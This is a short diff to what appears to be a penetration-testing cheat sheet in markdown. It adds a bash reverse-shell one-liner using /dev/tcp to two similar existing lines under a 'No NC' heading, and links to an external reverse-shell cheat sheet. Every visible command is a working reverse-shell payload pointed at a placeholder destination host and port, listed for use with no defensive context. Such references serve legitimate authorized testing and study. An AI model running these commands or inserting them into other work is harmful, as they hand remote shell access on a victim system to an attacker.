@@ -112,6 +112,7 @@
   - **No NC**:
     - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
     - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
+    - bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
   
 - **Reverse shell**
   - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
